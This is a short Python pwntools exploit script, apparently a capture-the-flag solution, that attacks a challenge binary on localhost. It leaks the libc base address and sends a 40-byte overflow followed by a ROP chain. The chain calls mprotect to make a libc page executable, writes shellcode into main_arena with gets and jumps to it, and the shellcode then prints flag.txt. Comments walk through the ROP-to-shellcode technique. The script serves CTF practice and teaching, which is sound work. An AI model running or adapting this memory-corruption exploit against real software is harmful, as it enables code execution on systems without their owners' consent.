#!/usr/bin/env python3

from pwn import *

exe = ELF("./program/chall")
libc = ELF("./program/libc.so.6")
ld = ELF("./program/ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
            sleep(2)
    else:
        r = remote("localhost", 1024)

    return r


def main():
    p = conn()

    # leak libc base
    p.readuntil("it's at")
    leak = int(p.readline(), 16)
    libc.address = leak - libc.sym["system"]
    info(f"{libc.address=:#x}")

    """
    since we can't use system(), we need
    to perform ROP-to-shellcode (aka, writing
    a rop chain that lets us execute arbitrary
    shellcode)
    
    the easiest way to do that is:
    - call mprotect() to set a page as RWX
    - write shellcode to that page with gets()
    - jump to that shellcode
    """

    # pwntools can auto-setup ROP chains for us
    r = ROP([libc], badchars=b"\n")

    # first we'll make the writable section of libc executable
    r.mprotect(libc.address + 0x21A000, 0x2000, 7)
    # next we'll write our shellcode to &main_arena
    # this is a large (~2000 bytes) symbol that normally stores heap metadata
    # but we can stomp over it since we're not using the heap
    # there's a billion other places that would work, this is just the one i used
    r.gets(libc.sym["main_arena"])
    # then we'll jump to it!
    r.raw(libc.sym["main_arena"])

    info(r.dump())
    p.sendlineafter(b"Surely that's not enough", b"A" * 40 + r.chain())
    p.sendline(
        asm(shellcraft.cat2("./flag.txt"))
    )  # shellcode that reads and prints flag.txt

    p.interactive()


if __name__ == "__main__":
    main()
